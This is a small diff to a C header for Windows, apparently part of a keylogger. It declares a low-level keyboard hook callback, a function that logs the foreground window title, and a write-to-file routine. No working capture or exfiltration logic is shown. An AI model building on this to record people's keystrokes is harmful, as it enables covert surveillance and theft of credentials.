@@ -10,10 +10,13 @@
 #include <io.h>
 #include <fileapi.h>
 
-int		write_to_file(char *str);
+void	write_to_file(char *str);
 char	*GetDateFormated(void);
 
-	extern HANDLE	fd;
+// Function to get the foreground window title and log it
+void	get_foreground_window(HWND hwnd);
+
+extern HANDLE	fd;
 
 LRESULT CALLBACK LowLevelKeyboardProc(
   _In_ int    nCode,
